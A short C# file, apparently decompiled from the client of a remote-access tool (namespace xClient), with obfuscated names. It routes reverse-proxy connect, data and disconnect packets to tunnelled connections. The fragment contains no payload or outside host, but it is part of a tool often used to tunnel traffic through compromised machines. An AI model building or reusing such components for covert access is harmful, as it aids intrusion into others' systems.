using System;
using xClient.Core.ReverseProxy.Packets;

public class GClass2
{
	public static void smethod_0(GClass33 client, GInterface4 packet)
	{
		Type type = packet.GetType();
		if (type == typeof(ReverseProxyConnect))
		{
			client.method_13((ReverseProxyConnect)packet);
		}
		else if (type == typeof(ReverseProxyData))
		{
			ReverseProxyData reverseProxyData = (ReverseProxyData)packet;
			client.method_14(reverseProxyData.ConnectionId)?.method_3(reverseProxyData.Data);
		}
		else if (type == typeof(ReverseProxyDisconnect))
		{
			ReverseProxyDisconnect reverseProxyDisconnect = (ReverseProxyDisconnect)packet;
			client.method_14(reverseProxyDisconnect.ConnectionId)?.method_2();
		}
	}
}
